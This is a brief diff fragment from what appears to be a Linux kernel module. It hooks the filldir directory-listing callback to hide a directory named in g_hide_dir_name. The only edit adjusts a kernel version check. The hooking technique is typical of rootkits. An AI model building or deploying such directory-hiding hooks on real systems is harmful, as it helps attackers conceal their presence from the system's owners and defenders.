@@ -14,7 +14,7 @@ static char g_hide_dir_name[256] = {0};
 
 static filldir_t old_filldir;
 
-#if MY_LINUX_VERSION_CODE < KERNEL_VERSION(6,1,0)
+#if MY_LINUX_VERSION_CODE < KERNEL_VERSION(6,2,0)
 static int my_filldir(struct dir_context *buf,
                       const char *name,
                       int namelen,
